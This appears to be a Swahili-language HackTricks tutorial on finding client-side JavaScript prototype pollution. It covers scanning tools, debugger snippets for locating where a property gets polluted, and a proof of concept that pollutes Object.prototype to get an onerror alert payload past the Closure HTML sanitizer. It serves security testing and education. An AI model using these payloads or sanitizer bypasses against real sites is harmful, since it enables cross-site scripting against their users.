# Uchafuzi wa Mteja wa Uundaji wa Prototipi

<details>

<summary><strong>Jifunze kuhusu udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inayotangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Kugundua kwa kutumia Zana za Kiotomatiki

Zana [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **na** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) zinaweza kutumika kwa **kutafuta udhaifu wa uundaji wa prototipi**.

Zaidi ya hayo, unaweza pia kutumia **kifaa cha upanuzi cha kivinjari** [**PPScan**](https://github.com/msrkp/PPScan) kwa **kutafuta kiotomatiki** **kurasa** unazofikia kwa udhaifu wa uundaji wa prototipi.

### Kurekebisha wapi mali inatumika <a href="#5530" id="5530"></a>

{% code overflow="wrap" %}
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype,'potentialGadget', {__proto__:null, get(){
console.trace();
return 'test';
}})
```
{% endcode %}

### Kupata chanzo cha msingi cha Uchafuzi wa Prototype <a href="#5530" id="5530"></a>

Mara tu ukiwa umetambua udhaifu wa uchafuzi wa prototype kwa kutumia zana yoyote, na ikiwa nambari sio ngumu sana, unaweza kupata udhaifu kwa kutafuta maneno kama `location.hash`, `decodeURIComponent`, au `location.search` kwenye Chrome Developer Tools. Njia hii inakuwezesha kugundua sehemu yenye udhaifu katika nambari ya JavaScript.

Kwa nambari kubwa na ngumu zaidi, njia rahisi ya kugundua nambari yenye udhaifu ni kufuata hatua zifuatazo:

1. Tumia zana ili kutambua udhaifu na kupata mzigo ulioundwa ili kuweka mali katika constructor. Mfano uliotolewa na ppmap unaweza kuonekana kama: `constructor[prototype][ppmap]=reserved`.
2. Weka kizuizi kwenye safu ya kwanza ya nambari ya JavaScript ambayo itatekelezwa kwenye ukurasa. Sasisha ukurasa na mzigo huo, ukisimamisha utekelezaji kwenye kizuizi hiki.
3. Wakati utekelezaji wa JavaScript unaposimama, tekeleza hati ifuatayo kwenye konsoli ya JS. Hati hii itatoa ishara wakati mali ya 'ppmap' inapoundwa, ikisaidia katika kutambua asili yake:
```javascript
function debugAccess(obj, prop, debugGet=true){

var origValue = obj[prop];

Object.defineProperty(obj, prop, {
get: function () {
if (debugGet)
debugger;
return origValue;
},
set: function(val) {
debugger;
origValue = val;
}
});

};

debugAccess(Object.prototype, 'ppmap')
```
4. Naviga kurudi kwenye kichupo cha **Vyanzo** na chagua "Endeleza utekelezaji wa hati". JavaScript itaendelea kutekelezwa, na mali ya 'ppmap' itachafuka kama ilivyotarajiwa. Kutumia kificho kilichotolewa kunawezesha kutambua eneo sahihi ambapo mali ya 'ppmap' imechafuka. Kwa kuchunguza **Mfumo wa Wito**, mizunguko tofauti ambapo uchafuzi umetokea inaweza kuonekana.

Wakati wa kuamua ni mizunguko ipi ya kuchunguza, mara nyingi ni muhimu kulenga mizunguko inayohusiana na faili za maktaba za JavaScript, kwani uchafuzi wa kigezo mara nyingi hutokea ndani ya maktaba hizi. Tambua mizunguko inayofaa kwa kuchunguza kiambatisho chake kwenye faili za maktaba (inayoonekana upande wa kulia, kama ilivyoonyeshwa kwenye picha iliyotolewa kwa mwongozo). Katika hali zenye mizunguko mingi, kama zile kwenye mistari 4 na 6, chaguo sahihi ni mizunguko kwenye mstari wa 4, kwani inawakilisha tukio la awali la uchafuzi na hivyo chanzo kikuu cha udhaifu. Kwa kubonyeza mizunguko hiyo, utaelekezwa kwenye nambari yenye udhaifu.

![https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg](https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## Kutafuta Vifaa vya Hati

Kifaa ni **kificho ambacho kitatumika mara tu udhaifu wa PP utakapogunduliwa**.

Ikiwa programu ni rahisi, tunaweza **kutafuta** maneno muhimu kama **`srcdoc/innerHTML/iframe/createElement`** na kuchunguza nambari ya chanzo na kuangalia ikiwa inaleta **utekelezaji wa JavaScript**. Mara nyingi, mbinu zilizotajwa zinaweza kutopata vifaa kabisa. Katika kesi hiyo, ukaguzi safi wa nambari ya chanzo unafunua vifaa vizuri kama mfano ulio hapo chini.

### Mfano wa Kupata Kifaa cha PP katika Nambari ya Maktaba ya Mithil

Angalia chapisho hili: [https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## Urekebishaji wa mizigo kwa maktaba zenye udhaifu

* [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
* [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## Kupitisha Wabainishaji wa HTML kupitia PP

[Utafiti huu](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) unaonyesha vifaa vya PP vya kutumia kwa **kupitisha wabainishaji** uliotolewa na baadhi ya maktaba za wabainishaji wa HTML:

* #### sanitize-html

<figure><img src="../../../.gitbook/assets/image (668).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-7.png"><figcaption></figcaption></figure>

* #### dompurify

<figure><img src="../../../.gitbook/assets/image (669).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-9.png"><figcaption></figcaption></figure>

* #### Closure
```html
<!-- from https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ -->
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## Marejeo

* [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
* [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
* [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
